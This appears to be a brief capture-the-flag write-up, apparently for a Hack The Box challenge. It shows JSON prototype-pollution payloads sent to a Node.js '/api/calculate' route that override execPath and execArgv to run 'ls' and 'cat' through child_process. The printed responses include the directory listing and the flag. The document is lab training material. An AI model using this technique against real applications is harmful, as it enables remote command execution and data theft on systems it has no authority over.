-> RCE `child_process` by `constructor`.

Route: POST /api/calculate

Payload:
```json
{
  "name": 1,
  "constructor": {
    "prototype": {
      "execPath": "ls",
      "execArgv": [
        "-la",
        "."
      ]
    }
  }
}
```

Response:
```
-rw-r--r-- 1 root root  318 Jun 26  2020 VersionCheck.js

.:
total 64
drwxr-xr-x  1 root root  4096 Jun 26  2020 .
drwxr-xr-x  1 root root  4096 Dec 22 15:17 ..
-rw-r--r--  1 root root    32 Jun 26  2020 .gitignore
-rw-r--r--  1 root root   318 Jun 26  2020 VersionCheck.js
-rw-r--r--  1 root root    43 Jun 26  2020 flag_e1T6f
drwxr-xr-x  2 root root  4096 Jun 26  2020 helpers
-rw-r--r--  1 root root   490 Jun 26  2020 index.js
drwxr-xr-x 56 root root  4096 Jun 26  2020 node_modules
-rw-r--r--  1 root root 14241 Jun 26  2020 package-lock.json
-rw-r--r--  1 root root   409 Jun 26  2020 package.json
drwxr-xr-x  2 root root  4096 Jun 26  2020 routes
drwxr-xr-x  5 root root  4096 Jun 26  2020 static
drwxr-xr-x  2 root root  4096 Jun 26  2020 views
```

Payload:
```json
{
  "name": 1,
  "constructor": {
    "prototype": {
      "execPath": "cat",
      "execArgv": [
        "flag_e1T6f",
        "."
      ]
    }
  }
}
```

Response:
```
HTB{l00s1ng_t3nur3_l1k3_it5_fr1d4y_m0rn1ng}const package = require('./package.json');
const nodeVersion = process.version;

if (package.nodeVersion == nodeVersion) {
    console.log(`Everything is OK (${package.nodeVersion} == ${nodeVersion})`);
}else{
    console.log(`You are using a different version of nodejs (${package.nodeVersion} != ${nodeVersion})`);
}
```